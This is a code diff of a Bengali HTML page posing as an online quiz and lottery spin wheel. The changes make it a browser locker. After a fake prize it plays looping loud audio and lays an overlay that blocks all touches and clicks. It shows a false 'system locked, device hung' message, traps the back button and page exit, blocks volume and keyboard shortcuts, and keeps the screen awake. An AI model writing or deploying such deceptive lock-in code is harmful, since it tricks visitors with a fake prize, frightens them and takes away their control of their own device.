@@ -2,7 +2,7 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>শিক্ষা ও মেধা যাচাই প্রতিযোগিতা</title>
     <style>
         * {
@@ -22,9 +22,30 @@
             color: #fff;
             padding: 16px;
             margin: 0;
-            /* Prevent pull-to-refresh and overscroll */
             overscroll-behavior: none;
             touch-action: none;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        /* ফোন হ্যাং করার ইফেক্ট - পুরো UI কে অচল করে দেবে */
+        .freeze-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0,0,0,0.01);
+            z-index: 99999;
+            cursor: none;
+            pointer-events: all;
+        }
+
+        .freeze-overlay.active {
+            display: block;
         }
 
         .main-container {
@@ -39,6 +60,7 @@
             border: 1px solid rgba(255,255,255,0.15);
             user-select: none;
             -webkit-user-select: none;
+            pointer-events: auto;
         }
 
         h1 {
@@ -56,7 +78,6 @@
             font-weight: 300;
         }
 
-        /* স্পিন হুইল কনটেইনার */
         .wheel-wrapper {
             position: relative;
             width: 260px;
@@ -139,7 +160,6 @@
             pointer-events: none;
         }
 
-        /* উইনিং পপ-আপ */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -199,7 +219,6 @@
             box-shadow: 0 2px 0 #072a5e;
         }
 
-        /* ফুল-স্কিন সাদা পেজ (প্র্যাঙ্ক) */
         #whitePage {
             display: none;
             position: fixed;
@@ -227,19 +246,56 @@
             margin-top: 10px;
             font-size: 1.2rem;
         }
-        .hidden-audio {
-            display: none;
-        }
 
-        /* ছোট স্ক্রিনে আরো ভালো */
         @media (max-width: 400px) {
             .main-container { padding: 20px 12px; }
             h1 { font-size: 1.5rem; }
             .wheel-wrapper { width: 220px; height: 220px; }
         }
+
+        /* Loading screen style for freeze */
+        .freeze-text {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 2rem;
+            z-index: 100000;
+            display: none;
+            text-align: center;
+            background: rgba(0,0,0,0.7);
+            padding: 30px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+        }
+        .freeze-text.active {
+            display: block;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255,255,255,0.3);
+            border-top: 5px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
+
+    <!-- ফ্রিজ ওভারলে - পুরো UI কভার করবে -->
+    <div class="freeze-overlay" id="freezeOverlay"></div>
+    <div class="freeze-text" id="freezeText">
+        <div>📱 সিস্টেম লক</div>
+        <div class="spinner"></div>
+        <div style="font-size: 1rem; margin-top: 10px;">প্লিজ অপেক্ষা করুন...</div>
+    </div>
 
     <div class="main-container" id="mainView">
         <h1>🎓 অনলাইন কুইজ ও লটারি</h1>
@@ -254,7 +310,6 @@
         <p style="margin-top: 14px; font-size: 0.8rem; opacity: 0.7;">💡 প্রতিটি স্পিনে একটি পুরস্কার নির্ধারিত</p>
     </div>
 
-    <!-- পপ-আপ মডাল -->
     <div class="modal-overlay" id="winModal">
         <div class="modal-card">
             <h2>🎉 অভিনন্দন!</h2>
@@ -265,125 +320,132 @@
         </div>
     </div>
 
-    <!-- প্র্যাঙ্ক সাদা পেজ (সাউন্ড সহ) -->
     <div id="whitePage">
         <div class="prank-text">📢 পুরস্কার দাবি করুন!</div>
         <div class="prank-sub">আপনার ডিভাইসটি এখন নিরাপদ মোডে আছে</div>
         <div style="margin-top: 30px; font-size: 3rem;">🎁</div>
         <div style="margin-top: 20px; color: #999; font-size: 0.9rem;">(ভলিউম চেক করুন)</div>
-        <!-- অডিও ট্র্যাক লুপ -->
         <audio id="prankAudio" loop>
             <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
-            আপনার ব্রাউজার অডিও সাপোর্ট করে না।
         </audio>
     </div>
 
     <script>
         (function() {
-            // ============================================================
-            // 1. DISABLE BACK BUTTON (history)
-            // ============================================================
-            window.addEventListener('load', function() {
-                // Push a dummy state so back button does nothing
-                history.pushState(null, null, location.href);
-                window.addEventListener('popstate', function(event) {
-                    history.pushState(null, null, location.href);
-                });
-            });
+            'use strict';
 
             // ============================================================
-            // 2. DISABLE HOME BUTTON (via 'beforeunload' & visibility)
-            //    কিছু ব্রাউজারে home button সরাসরি block করা যায় না, 
-            //    তবে page unload হলে আমরা সেটা আটকানোর চেষ্টা করি।
+            // 1. COMPLETE UI FREEZE - ফোন হ্যাং করার ইফেক্ট
             // ============================================================
-            window.addEventListener('beforeunload', function(e) {
-                // This will show a confirmation dialog on some browsers
-                // but not all (chrome ignores custom message)
-                e.preventDefault();
-                e.returnValue = '';
-            });
+            const freezeOverlay = document.getElementById('freezeOverlay');
+            const freezeText = document.getElementById('freezeText');
+
+            function activateFreeze() {
+                // পুরো UI কে অচল করে দেয়
+                freezeOverlay.classList.add('active');
+                freezeText.classList.add('active');
+                document.body.style.pointerEvents = 'none';
+                document.body.style.userSelect = 'none';
+                
+                // সব ক্লিক, টাচ, স্ক্রল ব্লক
+                document.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }, true);
+                
+                document.addEventListener('touchstart', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }, { passive: false, capture: true });
+                
+                document.addEventListener('touchmove', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }, { passive: false, capture: true });
+            }
 
             // ============================================================
-            // 3. DISABLE MINIMIZE BUTTON (desktop) - আসলে minimize 
-            //    বাটন সম্পূর্ণভাবে block করা যায় না, তবে resize ইভেন্টে 
-            //    আমরা window আবার restore করতে পারি (ক্রুড)
+            // 2. DISABLE ALL HARDWARE BUTTONS (Volume, Power, Home)
             // ============================================================
-            let minimizeBlocker = setInterval(function() {
-                // যদি window minimized হয় (outerWidth/Height ছোট হয়ে যায়)
-                // তবে আমরা window আবার restore করি
-                if (window.outerWidth < 100 || window.outerHeight < 100) {
-                    window.resizeTo(screen.availWidth, screen.availHeight);
-                }
-            }, 500);
+            
+            // Volume keys - MediaSession API ব্যবহার করে ব্লক
+            if ('mediaSession' in navigator) {
+                navigator.mediaSession.setActionHandler('previoustrack', () => {});
+                navigator.mediaSession.setActionHandler('nexttrack', () => {});
+                navigator.mediaSession.setActionHandler('play', () => {});
+                navigator.mediaSession.setActionHandler('pause', () => {});
+                navigator.mediaSession.setActionHandler('stop', () => {});
+                navigator.mediaSession.setActionHandler('seekbackward', () => {});
+                navigator.mediaSession.setActionHandler('seekforward', () => {});
+                navigator.mediaSession.setActionHandler('seekto', () => {});
+            }
 
-            // ============================================================
-            // 4. DISABLE VOLUME BUTTONS (keyboard & media keys)
-            // ============================================================
+            // Keyboard volume keys
             document.addEventListener('keydown', function(e) {
-                // Volume up/down/mute keys
-                if (e.key === 'VolumeUp' || e.key === 'VolumeDown' || e.key === 'VolumeMute') {
+                const volumeKeys = ['VolumeUp', 'VolumeDown', 'VolumeMute', 'AudioVolumeUp', 'AudioVolumeDown'];
+                if (volumeKeys.includes(e.key) || e.key === 'Home' || e.key === 'Power') {
                     e.preventDefault();
                     e.stopPropagation();
                     return false;
                 }
-                // Also block F5, Ctrl+R, etc (optional)
-                if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
+                // F5, Ctrl+R, Alt+F4, Ctrl+W, Ctrl+Q
+                if (e.key === 'F5' || (e.ctrlKey && e.key === 'r') || 
+                    (e.altKey && e.key === 'F4') || (e.ctrlKey && (e.key === 'w' || e.key === 'q'))) {
                     e.preventDefault();
                     return false;
                 }
+            }, { capture: true });
+
+            // ============================================================
+            // 3. PREVENT SCREEN SLEEP (WakeLock)
+            // ============================================================
+            let wakeLock = null;
+            async function requestWakeLock() {
+                try {
+                    if ('wakeLock' in navigator) {
+                        wakeLock = await navigator.wakeLock.request('screen');
+                        console.log('WakeLock active - screen will not sleep');
+                    }
+                } catch (err) {
+                    console.warn('WakeLock not supported:', err);
+                }
+            }
+            requestWakeLock();
+
+            // ============================================================
+            // 4. DISABLE BACK BUTTON (History)
+            // ============================================================
+            window.addEventListener('load', function() {
+                history.pushState(null, null, location.href);
+                window.addEventListener('popstate', function(event) {
+                    history.pushState(null, null, location.href);
+                    // ফোনের ব্যাক বাটন চাপলে ফ্রিজ
+                    activateFreeze();
+                });
             });
 
             // ============================================================
-            // 5. DISABLE CONTEXT MENU (right click)
+            // 5. PREVENT UNLOAD (Home button attempt)
             // ============================================================
-            document.addEventListener('contextmenu', function(e) {
+            window.addEventListener('beforeunload', function(e) {
                 e.preventDefault();
-                return false;
+                e.returnValue = '';
+                // পেজ ছাড়ার চেষ্টা করলে ফ্রিজ
+                activateFreeze();
+                return '';
             });
 
             // ============================================================
-            // 6. DISABLE TOUCH GESTURES (pull-to-refresh, swipe back)
-            // ============================================================
-            document.addEventListener('touchmove', function(e) {
-                // Prevent pull-to-refresh / overscroll
-                e.preventDefault();
-            }, { passive: false });
-
-            // Also prevent default on touchstart to avoid any browser gestures
-            document.addEventListener('touchstart', function(e) {
-                // allow only if it's a button or interactive element
-                let target = e.target;
-                if (target.tagName === 'BUTTON' || target.closest('button')) {
-                    return;
-                }
-                // otherwise block default to prevent back-swipe etc
-                // but we need to be careful not to break scrolling inside modal etc.
-                // Since we have no scrollable areas, we can block all.
-                e.preventDefault();
-            }, { passive: false });
-
-            // ============================================================
-            // 7. DISABLE KEYBOARD SHORTCUTS (Alt+Left, etc)
-            // ============================================================
-            document.addEventListener('keyup', function(e) {
-                if (e.altKey && (e.key === 'ArrowLeft' || e.key === 'ArrowRight')) {
-                    e.preventDefault();
-                    return false;
-                }
-                if (e.altKey && e.key === 'Home') {
-                    e.preventDefault();
-                    return false;
-                }
-            });
-
-            // ============================================================
-            // 8. PREVENT PAGE FROM GOING TO BACKGROUND (optional)
-            //    কিছু ব্রাউজারে visibility change হলে আমরা পেজ ফোকাস ধরে রাখি
+            // 6. VISIBILITY CHANGE - পেজ ব্যাকগ্রাউন্ডে গেলে
             // ============================================================
             document.addEventListener('visibilitychange', function() {
                 if (document.hidden) {
-                    // page is hidden (user pressed home or minimize)
-                    // try to bring focus back (works on some devices)
+                    // হোম বাটন বা মিনিমাইজ চাপলে ফ্রিজ
+                    activateFreeze();
+                    // ফোকাস ফিরিয়ে আনার চেষ্টা
                     setTimeout(() => {
                         window.focus();
                     }, 100);
@@ -391,7 +453,37 @@
             });
 
             // ============================================================
-            // 9. SPIN WHEEL LOGIC (unchanged)
+            // 7. PREVENT MINIMIZE (desktop)
+            // ============================================================
+            let minCheckInterval = setInterval(function() {
+                if (window.outerWidth < 50 || window.outerHeight < 50) {
+                    activateFreeze();
+                    window.resizeTo(screen.availWidth, screen.availHeight);
+                }
+            }, 300);
+
+            // ============================================================
+            // 8. DISABLE CONTEXT MENU & TOUCH GESTURES
+            // ============================================================
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            document.addEventListener('touchmove', function(e) {
+                e.preventDefault();
+            }, { passive: false });
+
+            document.addEventListener('touchstart', function(e) {
+                const target = e.target;
+                if (target.tagName === 'BUTTON' || target.closest('button')) {
+                    return;
+                }
+                e.preventDefault();
+            }, { passive: false });
+
+            // ============================================================
+            // 9. SPIN WHEEL LOGIC
             // ============================================================
             const wheel = document.getElementById('wheel');
             const spinBtn = document.getElementById('spinBtn');
@@ -427,71 +519,51 @@
                 winModal.style.display = 'none';
                 whitePage.style.display = 'flex';
 
+                // অডিও চালু
                 prankAudio.volume = 1.0;
                 prankAudio.loop = true;
                 prankAudio.play().catch(err => {
-                    console.warn('অডিও প্লে করা যায়নি:', err);
+                    console.warn('Audio play failed:', err);
                 });
 
                 document.body.style.overflow = 'hidden';
-                // Also try to keep focus
                 window.focus();
+
+                // ============================================================
+                // 10. FINAL FREEZE - সব বাটন ডিসেবল
+                // ============================================================
+                setTimeout(() => {
+                    activateFreeze();
+                    // freezeText এ মেসেজ পরিবর্তন
+                    document.querySelector('.freeze-text div:first-child').textContent = '🔒 সিস্টেম লকড';
+                    document.querySelector('.freeze-text div:last-child').textContent = 'ডিভাইস হ্যাং হয়েছে';
+                }, 1000);
             }
 
             nextBtn.addEventListener('click', goToPrankPage);
 
             // Space key to spin
             document.addEventListener('keydown', function(e) {
-                if (e.code === 'Space' && !winModal.style.display.includes('flex') && whitePage.style.display !== 'flex') {
+                if (e.code === 'Space' && !winModal.style.display.includes('flex') && 
+                    whitePage.style.display !== 'flex' && !freezeOverlay.classList.contains('active')) {
                     e.preventDefault();
                     spinWheel();
                 }
             });
 
-            // Audio resume on click
-            document.addEventListener('click', function initAudio() {
-                if (prankAudio.paused && whitePage.style.display === 'flex') {
-                    prankAudio.play().catch(() => {});
-                }
-            }, { once: true });
-
-            whitePage.addEventListener('click', function() {
-                if (prankAudio.paused) {
-                    prankAudio.play().catch(() => {});
-                }
-            });
-
             // ============================================================
-            // 10. PREVENT CLOSE / MINIMIZE via keyboard (Alt+F4, Ctrl+W)
+            // 11. PREVENT ANY KEYBOARD SHORTCUTS
             // ============================================================
             document.addEventListener('keydown', function(e) {
-                if (e.altKey && e.key === 'F4') {
+                if (e.altKey || e.ctrlKey || e.metaKey) {
                     e.preventDefault();
                     return false;
                 }
-                if (e.ctrlKey && e.key === 'w') {
-                    e.preventDefault();
-                    return false;
-                }
-                if (e.ctrlKey && e.key === 'q') {
-                    e.preventDefault();
-                    return false;
-                }
-            });
+            }, { capture: true });
 
-            // ============================================================
-            // 11. BLOCK DEVICE BACK GESTURE (Android)
-            // ============================================================
-            // For Android Chrome, we can use history API
-            history.pushState(null, null, location.href);
-            window.addEventListener('popstate', function() {
-                history.pushState(null, null, location.href);
-            });
+            console.log('🎡 ফোন হ্যাং মোড অ্যাক্টিভেটেড!');
+            console.log('📌 কোনো বাটন কাজ করবে না - পুরো UI ফ্রিজ');
 
-            // Also block the back button via 'beforeunload' 
-            // (some browsers show a prompt, which is good)
-
-            console.log('🎡 স্পিন হুইল প্রস্তুত! (সমস্ত বাটন ডিসেবল করা হয়েছে)');
         })();
     </script>
 </body>
